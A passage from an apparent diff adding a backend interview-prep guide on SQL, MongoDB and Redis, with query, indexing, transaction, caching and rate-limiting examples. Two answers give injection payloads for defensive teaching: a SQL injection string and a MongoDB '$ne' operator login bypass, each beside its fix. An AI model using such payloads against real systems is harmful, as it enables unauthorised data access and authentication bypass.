+GROUP BY city
+HAVING COUNT(*) > 100;
+```
+
+### Q8. What are window functions? Give examples.
+**Answer:** Window functions calculate across a set of related rows **without collapsing them** into one row (unlike GROUP BY). Syntax: `function() OVER (PARTITION BY ... ORDER BY ...)`. Common ones: `ROW_NUMBER`, `RANK`, `DENSE_RANK`, `LAG`, `LEAD`, `SUM() OVER`, `AVG() OVER`.
+
+**Example:**
+```sql
+-- Top 3 highest-paid employees per department
+SELECT * FROM (
+  SELECT name, department, salary,
+         DENSE_RANK() OVER (PARTITION BY department ORDER BY salary DESC) AS rnk
+  FROM employees
+) t
+WHERE rnk <= 3;
+
+-- Running total of revenue per day
+SELECT day, revenue,
+       SUM(revenue) OVER (ORDER BY day) AS running_total
+FROM daily_revenue;
+
+-- Month-over-month change
+SELECT month, revenue,
+       revenue - LAG(revenue) OVER (ORDER BY month) AS change
+FROM monthly_revenue;
+```
+
+### Q9. ROW_NUMBER vs RANK vs DENSE_RANK?
+**Answer:** For salaries 100, 90, 90, 80:
+| salary | ROW_NUMBER | RANK | DENSE_RANK |
+|---|---|---|---|
+| 100 | 1 | 1 | 1 |
+| 90 | 2 | 2 | 2 |
+| 90 | 3 | 2 | 2 |
+| 80 | 4 | 4 | 3 |
+
+`ROW_NUMBER` always unique; `RANK` leaves gaps after ties; `DENSE_RANK` has no gaps.
+
+### Q10. Write: find the second-highest salary.
+**Answer & Example:**
+```sql
+-- Using DENSE_RANK (handles ties)
+SELECT salary FROM (
+  SELECT salary, DENSE_RANK() OVER (ORDER BY salary DESC) AS r FROM employees
+) t WHERE r = 2 LIMIT 1;
+
+-- Using subquery
+SELECT MAX(salary) FROM employees
+WHERE salary < (SELECT MAX(salary) FROM employees);
+```
+
+### Q11. Write: top 5 customers by revenue last month.
+**Answer & Example:**
+```sql
+SELECT u.id, u.name, SUM(o.total) AS revenue, COUNT(*) AS orders
+FROM orders o
+JOIN users u ON u.id = o.user_id
+WHERE o.status = 'paid'
+  AND o.created_at >= date_trunc('month', now()) - INTERVAL '1 month'
+  AND o.created_at <  date_trunc('month', now())
+GROUP BY u.id, u.name
+ORDER BY revenue DESC
+LIMIT 5;
+```
+
+### Q12. Write: find duplicate emails and delete duplicates keeping the oldest.
+**Answer & Example:**
+```sql
+-- Find
+SELECT email, COUNT(*) FROM users GROUP BY email HAVING COUNT(*) > 1;
+
+-- Delete all but the lowest id per email
+DELETE FROM users u
+USING users d
+WHERE u.email = d.email AND u.id > d.id;
+```
+
+### Q13. What is a CTE? Subquery vs CTE? EXISTS vs IN?
+**Answer:** A **CTE** (`WITH`) is a named temporary result that makes complex queries readable; it can also be **recursive** (for hierarchies). `EXISTS` stops at the first match and handles NULLs well; it's often better for "does a related row exist?" checks. `IN` is fine for small lists. `UNION` removes duplicates (extra sort); `UNION ALL` keeps them and is faster.
+
+**Example:**
+```sql
+-- CTE
+WITH paid AS (
+  SELECT user_id, SUM(total) AS spent FROM orders WHERE status='paid' GROUP BY user_id
+)
+SELECT u.name, p.spent FROM users u JOIN paid p ON p.user_id = u.id WHERE p.spent > 5000;
+
+-- EXISTS
+SELECT * FROM users u
+WHERE EXISTS (SELECT 1 FROM orders o WHERE o.user_id = u.id AND o.status = 'paid');
+
+-- Recursive CTE: everyone under manager 1
+WITH RECURSIVE team AS (
+  SELECT id, name, manager_id FROM employees WHERE id = 1
+  UNION ALL
+  SELECT e.id, e.name, e.manager_id FROM employees e JOIN team t ON e.manager_id = t.id
+)
+SELECT * FROM team;
+```
+
+### Q14. What is an index and how does it work?
+**Answer:** An index is a separate data structure (usually a **B-tree**) that keeps column values sorted with pointers to rows, so the database can find rows in O(log n) instead of scanning the whole table. Trade-offs: faster reads, but extra storage and slower inserts/updates/deletes (every index must be updated).
+
+**Example:**
+```sql
+-- Without index: Seq Scan over 10M rows
+SELECT * FROM orders WHERE user_id = 42;
+
+CREATE INDEX idx_orders_user_id ON orders(user_id);
+-- Now: Index Scan, a few ms
+```
+
+### Q15. How does a composite index work? What is the leftmost-prefix rule?
+**Answer:** A composite index on `(a, b, c)` is sorted by `a`, then `b`, then `c`. It can be used for queries filtering on `a`, `a+b`, or `a+b+c` — but **not** `b` alone or `c` alone. Rule of thumb: put **equality** columns first, then **range**/**sort** columns.
+
+**Example:**
+```sql
+CREATE INDEX idx_orders_user_status_created ON orders(user_id, status, created_at DESC);
+
+-- ✅ uses index
+SELECT * FROM orders WHERE user_id = 42;
+SELECT * FROM orders WHERE user_id = 42 AND status = 'paid' ORDER BY created_at DESC LIMIT 20;
+-- ❌ can't use it efficiently
+SELECT * FROM orders WHERE status = 'paid';
+```
+
+### Q16. What are covering, partial, unique and expression indexes?
+**Answer:**
+- **Covering**: contains all columns the query needs → "Index Only Scan", no table lookup.
+- **Partial**: indexes only rows matching a condition — smaller and faster.
+- **Unique**: enforces uniqueness.
+- **Expression**: indexes the result of a function.
+- Other types: **GIN** (JSONB, arrays, full-text), **GiST** (geo), **BRIN** (huge time-ordered tables), **Hash**.
+
+**Example:**
+```sql
+CREATE INDEX idx_orders_cover ON orders(user_id) INCLUDE (total, status);       -- covering
+CREATE INDEX idx_orders_pending ON orders(created_at) WHERE status = 'pending'; -- partial
+CREATE UNIQUE INDEX idx_users_email_lower ON users(lower(email));               -- unique + expression
+CREATE INDEX idx_products_attrs ON products USING GIN (attributes);             -- JSONB
+```
+
+### Q17. Why might the database not use your index?
+**Answer:**
+1. A function on the column: `WHERE lower(email) = ...` (needs an expression index).
+2. Leading wildcard: `LIKE '%gmail.com'`.
+3. Type mismatch / implicit cast (`WHERE phone = 9876543210` on a text column).
+4. Low selectivity: the condition matches a large % of rows, so a full scan is cheaper.
+5. Composite index used without its leftmost column.
+6. `OR` across different columns.
+7. Outdated statistics (run `ANALYZE`).
+
+**Example:**
+```sql
+-- ❌ index on created_at not used
+WHERE DATE(created_at) = '2026-10-01'
+-- ✅ rewrite as range
+WHERE created_at >= '2026-10-01' AND created_at < '2026-10-02'
+```
+
+### Q18. Which columns should you index?
+**Answer:** Columns used in `WHERE`, `JOIN ... ON` (foreign keys!), `ORDER BY`, and `GROUP BY` on large tables, with high selectivity. Don't index everything: each index slows writes. Remove unused indexes (check `pg_stat_user_indexes`).
+
+### Q19. What is a transaction and what is ACID?
+**Answer:** A transaction groups operations into one unit of work.
+- **Atomicity**: all succeed or all roll back.
+- **Consistency**: data moves from one valid state to another (constraints hold).
+- **Isolation**: concurrent transactions don't see each other's partial work.
+- **Durability**: once committed, data survives crashes (write-ahead log).
+
+**Example:**
+```sql
+BEGIN;
+UPDATE accounts SET balance = balance - 500 WHERE id = 1;
+UPDATE accounts SET balance = balance + 500 WHERE id = 2;
+INSERT INTO transfers (from_id, to_id, amount) VALUES (1, 2, 500);
+COMMIT;   -- or ROLLBACK if anything failed
+```
+
+### Q20. Explain read anomalies and isolation levels.
+**Answer:**
+- **Dirty read**: reading another transaction's uncommitted data.
+- **Non-repeatable read**: reading the same row twice gives different values (someone updated it).
+- **Phantom read**: running the same query twice returns new rows (someone inserted).
+- **Lost update**: two transactions read-modify-write the same row; one overwrite is lost.
+
+| Level | Dirty | Non-repeatable | Phantom |
+|---|---|---|---|
+| Read Uncommitted | possible | possible | possible |
+| Read Committed (Postgres default) | ❌ | possible | possible |
+| Repeatable Read (MySQL default) | ❌ | ❌ | possible (Postgres prevents) |
+| Serializable | ❌ | ❌ | ❌ |
+
+Higher isolation = more safety, less concurrency; Serializable may abort transactions, so the app must retry.
+
+**Example:**
+```sql
+BEGIN ISOLATION LEVEL SERIALIZABLE;
+-- ...
+COMMIT; -- may fail with "could not serialize access" → retry the transaction
+```
+
+### Q21. Optimistic vs pessimistic locking?
+**Answer:**
+- **Pessimistic**: lock the row when reading (`SELECT ... FOR UPDATE`); others wait. Good when conflicts are frequent (inventory, bank balances).
+- **Optimistic**: no lock; keep a `version` column and check it on update. If 0 rows are updated, someone else changed it → retry or return 409. Good when conflicts are rare (editing a profile).
+
+**Example:**
+```sql
+-- Pessimistic: reserve stock safely
+BEGIN;
+SELECT stock FROM products WHERE id = 7 FOR UPDATE;
+-- app checks stock >= qty
+UPDATE products SET stock = stock - 2 WHERE id = 7;
+COMMIT;
+
+-- Optimistic
+UPDATE documents
+SET content = 'new text', version = version + 1
+WHERE id = 10 AND version = 4;
+-- 0 rows affected → conflict
+```
+
+Even simpler for counters — let the DB do it atomically:
+```sql
+UPDATE products SET stock = stock - 2 WHERE id = 7 AND stock >= 2;  -- 0 rows = out of stock
+```
+
+### Q22. What is a deadlock and how do you avoid it?
+**Answer:** Two transactions each hold a lock the other needs, so both wait forever; the DB detects it and aborts one. Avoid by locking rows in a **consistent order** (e.g. by id), keeping transactions **short**, not calling external APIs inside transactions, and retrying the aborted transaction.
+
+**Example:**
+```
+T1: locks account 1, then wants account 2
+T2: locks account 2, then wants account 1   → deadlock
+Fix: always lock the lower id first:  SELECT ... WHERE id IN (1,2) ORDER BY id FOR UPDATE;
+```
+
+### Q23. What is MVCC?
+**Answer:** Multi-Version Concurrency Control (Postgres, MySQL InnoDB): an update creates a new row version instead of overwriting; each transaction sees a consistent snapshot. Result: **readers don't block writers and writers don't block readers**. Old versions are cleaned up by `VACUUM` in Postgres.
+
+### Q24. How do you use transactions from Node.js?
+**Answer:** Get one client from the pool, run `BEGIN`, all queries on that client, `COMMIT` or `ROLLBACK` on error, and always release the client.
+
+**Example:**
+```ts
+async function withTransaction<T>(fn: (client: PoolClient) => Promise<T>): Promise<T> {
+  const client = await pool.connect();
+  try {
+    await client.query('BEGIN');
+    const result = await fn(client);
+    await client.query('COMMIT');
+    return result;
+  } catch (err) {
+    await client.query('ROLLBACK');
+    throw err;
+  } finally {
+    client.release();
+  }
+}
+
+await withTransaction(async (tx) => {
+  const { rows } = await tx.query(
+    'INSERT INTO orders (user_id, status, total) VALUES ($1, $2, $3) RETURNING id',
+    [userId, 'pending', total]
+  );
+  for (const item of items) {
+    const r = await tx.query('UPDATE products SET stock = stock - $1 WHERE id = $2 AND stock >= $1', [item.qty, item.productId]);
+    if (r.rowCount === 0) throw new AppError(409, 'OUT_OF_STOCK', `Product ${item.productId} out of stock`);
+    await tx.query('INSERT INTO order_items (order_id, product_id, qty, price) VALUES ($1,$2,$3,$4)',
+      [rows[0].id, item.productId, item.qty, item.price]);
+  }
+});
+```
+
+### Q25. How do you find and fix a slow query?
+**Answer:**
+1. Find it: `pg_stat_statements`, slow query log, APM traces.
+2. Run `EXPLAIN (ANALYZE, BUFFERS)` and read the plan.
+3. Look for: `Seq Scan` on big tables, estimated vs actual rows far apart (stale stats), expensive `Sort`, `Nested Loop` over many rows.
+4. Fix: add the right index, rewrite the query (range instead of function, avoid `SELECT *`), paginate with keyset, update stats (`ANALYZE`), denormalize or cache if needed.
+5. Measure again.
+
+**Example:**
+```sql
+EXPLAIN ANALYZE
+SELECT * FROM orders WHERE user_id = 42 ORDER BY created_at DESC LIMIT 20;
+
+-- Before:
+-- Limit -> Sort -> Seq Scan on orders (rows=8,000,000) ... Execution Time: 2400 ms
+CREATE INDEX idx_orders_user_created ON orders(user_id, created_at DESC);
+-- After:
+-- Limit -> Index Scan using idx_orders_user_created ... Execution Time: 0.4 ms
+```
+
+### Q26. What is the N+1 query problem?
+**Answer:** Loading a list with 1 query, then running 1 more query per item — 100 orders = 101 queries. Fix with a JOIN, a single `WHERE id IN (...)`/`ANY($1)` query, or the ORM's eager loading (`include`, `populate`). In GraphQL use DataLoader for batching.
+
+**Example:**
+```ts
+// ❌ N+1
+const orders = await db.query('SELECT * FROM orders LIMIT 100');
+for (const o of orders.rows) {
+  o.user = (await db.query('SELECT * FROM users WHERE id=$1', [o.user_id])).rows[0];
+}
+
+// ✅ 2 queries
+const orders2 = (await db.query('SELECT * FROM orders LIMIT 100')).rows;
+const ids = [...new Set(orders2.map(o => o.user_id))];
+const users = (await db.query('SELECT * FROM users WHERE id = ANY($1)', [ids])).rows;
+const byId = new Map(users.map(u => [u.id, u]));
+orders2.forEach(o => (o.user = byId.get(o.user_id)));
+```
+
+### Q27. What is connection pooling and why does it matter?
+**Answer:** Opening a DB connection is slow (TCP + auth) and each Postgres connection uses memory. A pool keeps a fixed number of open connections and reuses them. Size it so that `instances × pool size` stays below the DB's `max_connections`. For many app instances or serverless, use **PgBouncer** or RDS Proxy.
+
+**Example:**
+```ts
+import { Pool } from 'pg';
+export const pool = new Pool({
+  connectionString: env.DATABASE_URL,
+  max: 20,
+  idleTimeoutMillis: 30_000,
+  connectionTimeoutMillis: 2_000,
+});
+```
+
+### Q28. How do you scale a relational database?
+**Answer:** In order of effort:
+1. Optimise queries and indexes.
+2. Connection pooling.
+3. Caching (Redis) for hot reads.
+4. Vertical scaling (bigger instance).
+5. **Read replicas** for read traffic (beware replication lag — read your own writes from the primary).
+6. **Partitioning** big tables (e.g. by month) inside one DB.
+7. **Sharding** across databases (by user_id/tenant_id) — big complexity: cross-shard joins and transactions become hard.
+
+**Example:**
+```sql
+CREATE TABLE events (id BIGSERIAL, created_at TIMESTAMPTZ NOT NULL, payload JSONB)
+PARTITION BY RANGE (created_at);
+CREATE TABLE events_2026_10 PARTITION OF events
+  FOR VALUES FROM ('2026-10-01') TO ('2026-11-01');
+```
+
+### Q29. What is SQL injection and how do you prevent it?
+**Answer:** When user input is concatenated into SQL, an attacker can change the query. Prevent with **parameterised queries** (placeholders), ORMs/query builders, least-privilege DB users, and input validation.
+
+**Example:**
+```ts
+// ❌ email = "' OR '1'='1"  → returns all users
+db.query(`SELECT * FROM users WHERE email = '${email}'`);
+
+// ✅
+db.query('SELECT * FROM users WHERE email = $1', [email]);
+```
+
+### Q30. What are migrations and how do you do them safely in production?
+**Answer:** Migrations are versioned scripts that change the schema, stored in git and run in order (Prisma Migrate, Knex, TypeORM, Flyway, golang-migrate). Rules: never edit a migration that already ran; make changes **backward-compatible** so old and new app versions work during deploys (expand → migrate data → contract); create indexes `CONCURRENTLY` on big Postgres tables; test on a copy of production data.
+
+**Example — renaming a column with zero downtime:**
+```
+1. Add new column full_name (nullable)          ← deploy
+2. App writes both name and full_name           ← deploy
+3. Backfill full_name from name in batches
+4. App reads/writes only full_name              ← deploy
+5. Drop column name                             ← deploy
+```
+
+### Q31. Which data types should you use for money, time and flexible attributes?
+**Answer:** Money: `NUMERIC(12,2)` or integer paise/cents — **never FLOAT** (`0.1 + 0.2 ≠ 0.3`). Time: `TIMESTAMPTZ` (store in UTC). IDs: `BIGINT` or `UUID` (UUIDv7 is sortable). Flexible attributes: `JSONB` with a GIN index.
+
+**Example:**
+```sql
+SELECT 0.1::float + 0.2::float;      -- 0.30000000000000004
+SELECT 0.1::numeric + 0.2::numeric;  -- 0.3
+```
+
+### Q32. What is the difference between DELETE, TRUNCATE and DROP? And soft delete?
+**Answer:** `DELETE` removes chosen rows (can use WHERE, logged, can roll back). `TRUNCATE` removes all rows fast and resets storage. `DROP` removes the whole table. **Soft delete** keeps the row but sets `deleted_at`, so data can be restored and audited; remember to filter it out (and use partial indexes).
+
+**Example:**
+```sql
+UPDATE users SET deleted_at = now() WHERE id = 42;
+SELECT * FROM users WHERE deleted_at IS NULL;
+CREATE UNIQUE INDEX uniq_active_email ON users(email) WHERE deleted_at IS NULL;
+```
+
+---
+
+## 9. MongoDB / NoSQL
+
+### Q1. What are the main types of NoSQL databases?
+**Answer:**
+| Type | Examples | Use case |
+|---|---|---|
+| Document | MongoDB, Couchbase | JSON-like flexible records (catalogues, CMS, user profiles) |
+| Key-value | Redis, DynamoDB | Cache, sessions, simple fast lookups |
+| Wide-column | Cassandra, ScyllaDB | Huge write volume, time series, IoT |
+| Graph | Neo4j | Relationships (social networks, recommendations, fraud) |
+| Search | Elasticsearch, OpenSearch | Full-text search, log analytics |
+
+### Q2. SQL vs NoSQL — how do you choose?
+**Answer:**
+| Choose SQL when | Choose NoSQL when |
+|---|---|
+| Data is relational with many joins | Data is naturally nested/document-shaped |
+| Strong consistency and multi-row transactions (payments, orders, inventory) | Schema changes often or varies per record |
+| Complex ad-hoc reporting | Massive scale / write throughput with simple access patterns |
+| Fixed, well-known structure | Specific need: caching, search, graph |
+
+Many systems use both (polyglot persistence): Postgres for orders, Redis for cache, Elasticsearch for search.
+
+### Q3. What is the CAP theorem?
+**Answer:** In a distributed system, during a **network Partition**, you must choose between **Consistency** (every read gets the latest write, or an error) and **Availability** (every request gets a response, maybe stale). Since partitions will happen, real systems are **CP** (e.g. MongoDB with majority writes, HBase) or **AP** (Cassandra, DynamoDB default). **PACELC** extends it: Else (no partition), choose between Latency and Consistency.
+
+**Example:** A banking balance should be CP (refuse rather than show wrong money). A social media like-count can be AP (slightly stale is fine).
+
+### Q4. ACID vs BASE?
+**Answer:** **ACID** (SQL): atomic, consistent, isolated, durable transactions. **BASE** (many NoSQL): **B**asically **A**vailable, **S**oft state, **E**ventually consistent — the system stays available and replicas converge over time.
+
+### Q5. Embedding vs referencing in MongoDB?
+**Answer:** **Embed** when data is read together, belongs to the parent, and is bounded (one-to-few). **Reference** when data is large or unbounded, shared by many documents, or updated independently. Document limit is **16 MB**; never let an array grow without bound.
+
+**Example:**
+```js
+// Embed: order with its items (always read together, bounded)
+{
+  _id: ObjectId("..."),
+  userId: ObjectId("..."),
+  status: "paid",
+  items: [
+    { productId: ObjectId("..."), name: "Pen", qty: 2, price: 20 },
+    { productId: ObjectId("..."), name: "Book", qty: 1, price: 300 }
+  ],
+  total: 340,
+  createdAt: ISODate("2026-10-01")
+}
+
+// Reference: user activity logs (unbounded) in their own collection
+// activity_logs: { _id, userId: ObjectId("..."), action: "login", at: ISODate(...) }
+```
+
+### Q6. Name some MongoDB schema design patterns.
+**Answer:**
+- **Extended reference**: copy frequently needed fields (customer name into order) to avoid lookups.
+- **Subset**: embed only the latest/most used items (last 10 reviews), keep the rest in another collection.
+- **Bucket**: group time-series data (one document per sensor per hour with an array of readings).
+- **Computed**: store pre-computed values (`totalReviews`, `avgRating`) updated on write.
+- **Outlier**: handle rare huge documents separately.
+- **Polymorphic**: different shapes in one collection with a `type` field.
+
+**Example (bucket):**
+```js
+{ sensorId: 12, hour: ISODate("2026-10-07T10:00Z"), count: 60,
+  readings: [{ t: 0, v: 22.1 }, { t: 60, v: 22.3 } /* ... */] }
+```
+
+### Q7. What indexes does MongoDB support? What is the ESR rule?
+**Answer:** Single-field, **compound**, multikey (array fields), text, geospatial (2dsphere), hashed (sharding), **TTL** (auto-delete), unique, partial, wildcard. For compound indexes follow **ESR**: **E**quality fields first, then **S**ort fields, then **R**ange fields.
+
+**Example:**
+```js
+// Query: status = 'paid', createdAt > X, sorted by total
+db.orders.createIndex({ status: 1, total: -1, createdAt: 1 }); // E, S, R
+
+db.sessions.createIndex({ createdAt: 1 }, { expireAfterSeconds: 3600 }); // TTL
+db.users.createIndex({ email: 1 }, { unique: true });
+db.orders.createIndex({ createdAt: 1 }, { partialFilterExpression: { status: 'pending' } });
+```
+
+### Q8. How do you find a slow MongoDB query?
+**Answer:** Enable the profiler or check slow query logs; run `.explain('executionStats')`. Look for `COLLSCAN` (no index), `totalDocsExamined` much larger than `nReturned`, and in-memory `SORT` stages. Add or fix indexes, use projections to return fewer fields, and `.lean()` in Mongoose.
+
+**Example:**
+```js
+db.orders.find({ userId: ObjectId("..."), status: "paid" })
+  .sort({ createdAt: -1 })
+  .explain("executionStats");
+// Bad:  stage: COLLSCAN, totalDocsExamined: 2,000,000, nReturned: 15
+// Good: stage: IXSCAN,   totalDocsExamined: 15,        nReturned: 15
+```
+
+### Q9. Explain the aggregation pipeline.
+**Answer:** Documents flow through stages, each transforming the data. Common stages: `$match` (filter), `$group`, `$project`, `$sort`, `$limit`, `$lookup` (join), `$unwind` (flatten arrays), `$addFields`, `$facet` (multiple pipelines at once). Put `$match` and `$sort` early so they can use indexes.
+
+**Example — top 5 customers by revenue in September:**
+```js
+db.orders.aggregate([
+  { $match: { status: "paid", createdAt: { $gte: ISODate("2026-09-01"), $lt: ISODate("2026-10-01") } } },
+  { $group: { _id: "$userId", revenue: { $sum: "$total" }, orders: { $sum: 1 } } },
+  { $sort: { revenue: -1 } },
+  { $limit: 5 },
+  { $lookup: { from: "users", localField: "_id", foreignField: "_id", as: "user" } },
+  { $unwind: "$user" },
+  { $project: { _id: 0, name: "$user.name", revenue: 1, orders: 1 } }
+]);
+```
+
+### Q10. What are atomic update operators and bulk writes?
+**Answer:** Single-document updates are atomic. Use operators instead of read-modify-write to avoid race conditions: `$set`, `$inc`, `$push`, `$addToSet`, `$pull`, `$unset`. For many updates in one round trip, use `bulkWrite`.
+
+**Example:**
+```js
+// Atomic stock decrement only if enough stock
+const res = await db.products.updateOne(
+  { _id: productId, stock: { $gte: 2 } },
+  { $inc: { stock: -2 } }
+);
+if (res.modifiedCount === 0) throw new Error('Out of stock');
+
+// Bulk update project statuses
+await db.projects.bulkWrite([
+  { updateOne: { filter: { _id: id1 }, update: { $set: { status: 'execution' } } } },
+  { updateOne: { filter: { _id: id2 }, update: { $set: { status: 'handover' } } } },
+]);
+```
+
+### Q11. Does MongoDB support transactions?
+**Answer:** Yes — multi-document ACID transactions since 4.0 (needs a replica set or sharded cluster). They have performance costs and time limits, so prefer designing documents so one write is enough; use transactions when you truly must update several documents together.
+
+**Example:**
+```js
+const session = client.startSession();
+await session.withTransaction(async () => {
+  await accounts.updateOne({ _id: from }, { $inc: { balance: -500 } }, { session });
+  await accounts.updateOne({ _id: to },   { $inc: { balance:  500 } }, { session });
+});
+await session.endSession();
+```
+
+### Q12. What is a replica set? What are write concern and read preference?
+**Answer:** A **replica set** is a group of MongoDB servers with the same data: one **primary** (accepts writes) and **secondaries** (replicate). If the primary fails, an election promotes a secondary (automatic failover).
+- **Write concern** `w: 1` (primary acknowledged) vs `w: "majority"` (most members — durable across failover).
+- **Read preference**: `primary` (always fresh), `secondaryPreferred` (spread load, may be stale).
+
+**Example:**
+```js
+await orders.insertOne(order, { writeConcern: { w: 'majority' } });
+const reports = await orders.find({}).readPref('secondaryPreferred').toArray();
+```
+
+### Q13. What is sharding and how do you choose a shard key?
+**Answer:** Sharding splits a collection across multiple servers by a **shard key**. A good key has **high cardinality**, spreads writes **evenly**, and matches common queries (so they hit one shard). A **monotonically increasing** key (timestamp, ObjectId) sends all new writes to one shard (hot shard) — use a hashed key or compound key instead.
+
+**Example:**
+```js
+sh.shardCollection("shop.orders", { customerId: "hashed" });
+// or compound: { tenantId: 1, createdAt: 1 }
+```
+
+### Q14. What are change streams?
+**Answer:** A way to subscribe to real-time inserts/updates/deletes on a collection (uses the oplog; needs a replica set). Useful for syncing to search indexes, cache invalidation, triggering notifications, and event-driven designs.
+
+**Example:**
+```js
+const stream = db.collection('orders').watch([{ $match: { operationType: 'update', 'updateDescription.updatedFields.status': 'shipped' } }]);
+stream.on('change', (change) => notifyCustomer(change.documentKey._id));
+```
+
+### Q15. Mongoose: what are schemas, `populate`, and `lean`?
+**Answer:** A **schema** defines document structure, validation and defaults. `populate()` replaces referenced ids with documents (runs extra queries — watch for N+1 at scale). `lean()` returns plain JS objects instead of Mongoose documents — much faster for read-only queries.
+
+**Example:**
+```js
+const orderSchema = new mongoose.Schema({
+  user: { type: mongoose.Schema.Types.ObjectId, ref: 'User', required: true, index: true },
+  status: { type: String, enum: ['pending', 'paid', 'shipped'], default: 'pending' },
+  total: { type: Number, min: 0, required: true },
+}, { timestamps: true });
+
+const orders = await Order.find({ status: 'paid' })
+  .populate('user', 'name email')
+  .select('total status createdAt')
+  .lean();
+```
+
+### Q16. How do you prevent NoSQL injection in MongoDB?
+**Answer:** If you pass request input directly, an attacker can send operators like `{"$gt": ""}`. Validate types with a schema (expect a string, reject objects), use `express-mongo-sanitize`, and avoid `$where`.
+
+**Example:**
+```js
+// Attack body: { "email": "admin@x.com", "password": { "$ne": null } }
+// ❌
+User.findOne({ email: req.body.email, password: req.body.password });
+// ✅ Validate: z.object({ email: z.string().email(), password: z.string() })
+```
+
+---
+
+## 10. Redis and Caching
+
+### Q1. What is Redis and why is it so fast?
+**Answer:** Redis is an **in-memory** key-value data store with rich data structures. It's fast because data lives in RAM, it uses efficient data structures, and command execution is **single-threaded** (no lock overhead) with I/O multiplexing. Typical operations take well under a millisecond. Persistence is optional: **RDB** (periodic snapshots) and **AOF** (append-only log of writes).
+
+### Q2. What data structures does Redis provide, and what are they used for?
+**Answer & Example:**
+```bash
+# String: cache, counters
+SET product:7 '{"name":"Pen","price":20}' EX 300
+INCR page:home:views
+
+# Hash: object fields
+HSET user:42 name "Asha" plan "pro"
+HGET user:42 plan
+
+# List: queue / recent items
+LPUSH recent:user:42 "product:7"
+LTRIM recent:user:42 0 9          # keep last 10
+
+# Set: unique members
+SADD online_users 42 43
+SISMEMBER online_users 42
+
+# Sorted set: leaderboard
+ZADD leaderboard 1500 "user:42" 2200 "user:43"
+ZREVRANGE leaderboard 0 9 WITHSCORES
+
+# Stream: durable event log with consumer groups
+XADD orders * orderId 981 status paid
+
+# Pub/Sub: broadcast (no persistence)
+PUBLISH order-updates '{"orderId":981,"status":"shipped"}'
+```
+
+### Q3. What are common use cases for Redis?
+**Answer:** Caching, session storage, rate limiting, distributed locks, job queues (BullMQ), leaderboards, real-time counters, pub/sub for WebSocket fan-out across servers, idempotency keys, OTP storage with expiry, feature flags.
+
+### Q4. Explain caching strategies.
+**Answer:**
+| Strategy | How | Pros / Cons |
+|---|---|---|
+| **Cache-aside** (lazy) | App checks cache → on miss, read DB and fill cache | Most common; only caches what's used; first request is slow |
+| **Read-through** | Cache library loads from DB on miss | Simpler app code |
+| **Write-through** | Write cache and DB together | Cache always fresh; slower writes |
+| **Write-behind** | Write cache, flush to DB later | Very fast writes; risk of data loss |
+| **Write-around** | Write only to DB; cache filled on next read | Avoids caching data never read |
+
+**Example (cache-aside):**
+```ts
+async function getProduct(id: string) {
+  const key = `product:${id}`;
+  const cached = await redis.get(key);
+  if (cached) return JSON.parse(cached);                  // cache hit
+
+  const product = await productRepo.findById(id);         // cache miss
+  if (product) {
+    const ttl = 300 + Math.floor(Math.random() * 60);     // TTL + jitter
+    await redis.set(key, JSON.stringify(product), 'EX', ttl);
+  }
+  return product;
+}
+
+async function updateProduct(id: string, data: Partial<Product>) {
+  const updated = await productRepo.update(id, data);
+  await redis.del(`product:${id}`);                        // invalidate
+  return updated;
+}
+```
+
+### Q5. What should and shouldn't you cache?
+**Answer:** **Cache**: read-heavy data that changes rarely and is expensive to compute (product catalogue, config, user profiles, computed reports, third-party API responses). **Don't cache**: highly personal/sensitive data without care, data that must be perfectly fresh (account balance during payment), rarely read data, or anything where staleness could cause wrong business decisions.
+
+### Q6. How do you invalidate a cache?
+**Answer:** "There are only two hard things in computer science: cache invalidation and naming things."
+- **TTL**: every key expires eventually (safety net).
+- **Delete on write**: after updating the DB, delete the key (next read refills). Safer than updating the cache because it avoids race conditions writing stale values.
+- **Event-based**: publish a change event; consumers delete related keys.
+- **Versioned keys**: `product:7:v3`; bump the version to invalidate.
+
+### Q7. What is a cache stampede and how do you prevent it?
+**Answer:** A popular key expires and thousands of requests miss at once, all hitting the database together. Fixes:
+- **Lock / single flight**: only one request rebuilds; others wait or serve stale.
+- **Early refresh**: refresh before expiry in the background.
+- **TTL jitter**: random TTLs so keys don't expire together.
+
+**Example:**
+```ts
+async function getWithLock(key: string, loader: () => Promise<any>, ttl = 300) {
+  const cached = await redis.get(key);
+  if (cached) return JSON.parse(cached);
+
+  const gotLock = await redis.set(`lock:${key}`, '1', 'NX', 'EX', 10);
+  if (gotLock) {
+    try {
+      const value = await loader();
+      await redis.set(key, JSON.stringify(value), 'EX', ttl);
+      return value;
+    } finally {
+      await redis.del(`lock:${key}`);
+    }
+  }
+  await new Promise(r => setTimeout(r, 100)); // wait and retry
+  return getWithLock(key, loader, ttl);
+}
+```
+
+### Q8. What are cache penetration and cache avalanche?
+**Answer:**
+- **Penetration**: requests for keys that don't exist (e.g. random ids from an attacker) always miss and hit the DB. Fix: cache "not found" briefly, validate ids, use a **Bloom filter**.
+- **Avalanche**: many keys expire at the same time or Redis goes down, sending all traffic to the DB. Fix: TTL jitter, Redis high availability, circuit breakers, rate limiting.
+
+**Example:**
+```ts
+if (!product) await redis.set(key, 'null', 'EX', 60); // cache the miss
+```
+
+### Q9. What happens when Redis memory is full? (Eviction policies)
+**Answer:** Depends on `maxmemory-policy`:
+- `noeviction`: writes fail (good for queues/data you must not lose).
+- `allkeys-lru`: evict least recently used keys (typical for pure cache).
+- `allkeys-lfu`: evict least frequently used.
+- `volatile-lru` / `volatile-ttl`: evict only keys that have a TTL.
+
+### Q10. How do you implement rate limiting with Redis?
+**Answer:**
+- **Fixed window**: count requests per user per minute with `INCR` + `EXPIRE`. Simple, but allows bursts at window boundaries.
+- **Sliding window log/counter**: more accurate (sorted set of timestamps).
+- **Token bucket**: tokens refill at a steady rate; each request takes one; allows short bursts.
+
+**Example (fixed window):**
+```ts
+async function rateLimit(req, res, next) {
+  const key = `rl:${req.user?.id ?? req.ip}:${Math.floor(Date.now() / 60000)}`;
+  const count = await redis.incr(key);
+  if (count === 1) await redis.expire(key, 60);
+  res.setHeader('X-RateLimit-Remaining', Math.max(0, 100 - count));
+  if (count > 100) {
+    res.setHeader('Retry-After', '60');
+    return res.status(429).json({ error: 'Too many requests' });
+  }
+  next();
+}
+```
+
+**Example (sliding window with sorted set):**
+```ts
+const now = Date.now();
+const key = `rl:${userId}`;
+await redis.multi()
+  .zremrangebyscore(key, 0, now - 60_000)   // drop entries older than 1 min
+  .zadd(key, now, `${now}-${Math.random()}`)
+  .zcard(key)
+  .expire(key, 60)
+  .exec();
+```
+
+### Q11. How does a distributed lock work in Redis? What are the risks?
